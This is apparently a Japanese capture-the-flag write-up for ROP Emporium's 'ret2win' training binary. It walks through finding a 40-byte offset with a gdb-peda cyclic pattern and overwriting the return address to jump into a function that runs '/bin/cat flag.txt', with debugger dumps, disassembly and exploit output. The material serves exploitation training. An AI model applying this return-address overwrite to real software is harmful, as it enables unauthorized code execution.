ret2win関数で`/bin/cat flag.txt`を呼び出せば勝ち.

カナリアがないので, fgetsのBOFを利用します.

```
pattc 50
(省略)

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdc10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0x1f 
RDX: 0x7ffff7dd18d0 --> 0x0 
RSI: 0x7fffffffdc10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RDI: 0x7fffffffdc11 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdc38 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:	ret)
R8 : 0x0 
R9 : 0x7ffff7fd44c0 (0x00007ffff7fd44c0)
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdd20 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>:	call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>:	nop
   0x40080f <pwnme+90>:	leave  
=> 0x400810 <pwnme+91>:	ret    
   0x400811 <ret2win>:	push   rbp
   0x400812 <ret2win+1>:	mov    rbp,rsp
   0x400815 <ret2win+4>:	mov    edi,0x4009e0
   0x40081a <ret2win+9>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc38 ("AA0AAFAAb")
0008| 0x7fffffffdc40 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffdc48 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0024| 0x7fffffffdc50 --> 0x0 
0032| 0x7fffffffdc58 --> 0x7fffffffdd28 --> 0x7fffffffe09a ("/home/msy/Desktop/ctf/rop_emporium/ret2iwin/ret2win")
0040| 0x7fffffffdc60 --> 0x100000000 
0048| 0x7fffffffdc68 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffdc70 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ patto AA0AAFAAb
AA0AAFAAb found at offset: 40
```
オフセットが40だとわかったので, あとは適当に40バイト埋めたあと, リターンアドレスを飛びたいアドレスへ書き換えることでflagをゲットします.

ということで, ret2win内のprintfに飛べばflagを読めるのでjmp.
```
| |           0x00400811      push rbp                | 0x004006c0 0 register_t|
| |           0x00400812      mov rbp, rsp            | 0x00400700 0 __do_globa|
| |           0x00400815      mov edi, str.Thank_you__| 0x00601088 1 completed.|
| |           0x0040081a      mov eax, 0              | 0x00600e18 0 __do_globa|
| |           0x0040081f      call sym.imp.printf     |------------------------.
| |           0x00400824      mov edi, str.bin_cat_fla|   Stack                |
| |           0x00400829      call sym.imp.system     | - offset -   0 1  2 3  |
| |           0x0040082e      nop                     | 0x00178000  ffff ffff f|
| |           0x0040082f      pop rbp                 | 0x0017800e  ffff ffff f|
| \           0x00400830      ret                     | 0x0017801c  ffff ffff f|
|             0x00400831      nop word cs:[rax + rax] | 0x0017802a  ffff ffff f|
|             0x0040083b      nop dword [rax + rax]
```

以下、動作結果
```
$ python exploit.py 
[*] 'rop_emporium/ret2iwin/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 6007
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 
[*] Switching to interactive mode
\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x04ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2win' stopped with exit code 0 (pid 6007)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
```
